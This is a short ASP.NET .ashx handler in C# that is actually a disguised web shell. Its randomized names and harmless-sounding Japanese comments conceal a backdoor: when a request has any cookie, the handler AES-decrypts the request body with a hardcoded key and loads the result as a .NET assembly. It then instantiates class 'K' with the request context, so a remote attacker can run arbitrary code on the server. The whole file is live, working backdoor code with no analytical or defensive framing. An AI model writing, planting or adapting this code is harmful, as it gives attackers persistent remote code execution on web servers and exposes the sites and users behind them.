<%@ WebHandler Language="C#" Class="proc_f1g2" %>
using System.Web;using System.Text;using System.Reflection;using System.Security.Cryptography;
// 月が綺麗ですね
public class proc_f1g2:IHttpHandler{
    public void ProcessRequest(HttpContext ctx_a3b4){
        // サーバーの状態を確認します。
        if(ctx_a3b4.Request.Cookies.Count > 0){
            var key_str_c5d6 = new char[]{'c','a','6','3','4','5','7','5','3','8','b','9','b','1','e','0'};
            var key_e7f8 = Encoding.Default.GetBytes(new string(key_str_c5d6));

            // リクエストからデータを読み込む。
            var data_g9h0 = new byte[ctx_a3b4.Request.ContentLength];
            ctx_a3b4.Request.InputStream.Read(data_g9h0, 0, data_g9h0.Length);
            
            var provider_i1j2 = new RijndaelManaged();
            // データを復号する準備。
            var transformer_k3l4 = provider_i1j2.CreateDecryptor(key_e7f8,key_e7f8);
            var result_m5n6 = transformer_k3l4.TransformFinalBlock(data_g9h0, 0, data_g9h0.Length);

            // モジュールを動的にロードします。
            var asm_o7p8 = Assembly.Load(result_m5n6);
            
            var class_name_q9r0 = "K";
            // 新しいインスタンスを作成する。
            var inst_s1t2 = asm_o7p8.CreateInstance(class_name_q9r0);

            // ちょっと待ってください。
            inst_s1t2.Equals(ctx_a3b4);
        }
    }
    // このハンドラは再利用できません。
    public bool IsReusable{get{return false;}}
}